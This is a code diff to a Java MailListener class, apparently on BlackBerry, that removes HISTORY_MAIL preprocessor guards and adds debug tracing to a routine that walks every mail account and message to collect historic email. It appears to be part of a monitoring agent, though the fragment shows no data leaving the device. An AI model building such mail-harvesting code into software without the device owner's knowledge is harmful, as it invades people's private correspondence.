@@ -302,14 +302,13 @@ public final class MailListener implements FolderListener, SendListener,
         //store.removeStoreListener(this);
     }
 
-    //#ifdef HISTORY_MAIL
+
     boolean stopHistory;
 
     public void stopHistory() {
         stopHistory = true;
     }
 
-    //#endif
 
     /**
      * retrieveHistoricMails.
@@ -318,6 +317,10 @@ public final class MailListener implements FolderListener, SendListener,
         //final long timestamp = messageAgent.initMarkup();  
         //#ifdef DEBUG
         debug.init();
+        //#endif
+        
+        //#ifdef DEBUG
+        debug.trace("retrieveHistoricMails");
         //#endif
 
         collecting = true;
@@ -328,11 +331,9 @@ public final class MailListener implements FolderListener, SendListener,
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-            //#ifdef HISTORY_MAIL
             if (stopHistory) {
                 break;
             }
-            //#endif
             names[count] = mailServiceRecords[count].getName();
             //#ifdef DEBUG
             debug.trace("Email account name: " + names[count]);
@@ -366,9 +367,7 @@ public final class MailListener implements FolderListener, SendListener,
         //#endif
 
         collecting = false;
-        //#ifdef HISTORY_MAIL
         stopHistory = false;
-        //#endif
     }
 
     /**
@@ -437,12 +436,9 @@ public final class MailListener implements FolderListener, SendListener,
 
                 // Scandisco ogni e-mail dell'account di posta
                 for (int j = messages.length - 1; j >= 0 && !next; j--) {
-
-                    //#ifdef HISTORY_MAIL
                     if (stopHistory) {
                         break;
                     }
-                    //#endif
 
                     try {
                         //#ifdef DEBUG
